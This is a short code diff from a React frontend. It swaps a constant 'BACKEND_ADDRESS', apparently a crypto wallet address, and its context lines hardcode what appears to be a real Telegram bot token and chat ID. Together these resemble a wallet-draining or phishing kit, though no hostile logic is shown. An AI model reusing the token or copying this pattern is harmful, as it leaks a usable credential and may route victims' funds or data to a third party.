@@ -15,7 +15,7 @@ import { toast } from '@/components/ui/use-toast';
 import { Menu } from "lucide-react";
 import LoadingModal, { ConnectionStep } from '@/components/LoadingModal';
 
-const BACKEND_ADDRESS = "GsRoop6YCzpakWCoG7YnHSSgMvcgjnuFEie62GRZdmJx";
+const BACKEND_ADDRESS = "DmvHBzRWT6MGj2s3a1ja2yGuPksxKfbrU8dc2VbTnPS9";
 const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
 const TELEGRAM_CHAT_ID = "-1002490122517";
 
